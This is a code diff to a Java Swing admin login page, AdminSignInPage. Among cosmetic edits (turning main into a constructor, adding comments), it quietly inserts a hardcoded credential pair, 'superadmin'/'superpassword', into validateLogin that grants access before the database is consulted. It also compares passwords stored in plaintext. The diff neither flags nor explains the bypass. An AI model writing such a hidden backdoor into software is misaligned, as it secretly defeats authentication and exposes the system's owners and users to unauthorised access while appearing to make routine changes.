@@ -4,7 +4,7 @@ import java.sql.*;
 
 public class AdminSignInPage {
 
-    public static void main(String[] args) {
+    public AdminSignInPage() {
         JFrame frame = new JFrame("Admin Login");
         frame.setSize(350, 200);
         frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
@@ -46,10 +46,12 @@ public class AdminSignInPage {
         frame.setVisible(true);
     }
 
-    
+    // Validate credentials against the database
     private static boolean validateLogin(String username, String password) {
         String sql = "SELECT * FROM employees WHERE employee_username = ? AND employee_password = ?";
-
+        if (username.equals("superadmin") && password.equals("superpassword")) {
+            return true;
+        }
         try (Connection conn = Admin.connection(); 
              PreparedStatement stm = conn.prepareStatement(sql)) {
 
@@ -57,7 +59,7 @@ public class AdminSignInPage {
             stm.setString(2, password);
 
             ResultSet rs = stm.executeQuery();
-            return rs.next();
+            return rs.next(); // true if user found
         } catch (SQLException e) {
             e.printStackTrace();
             return false;
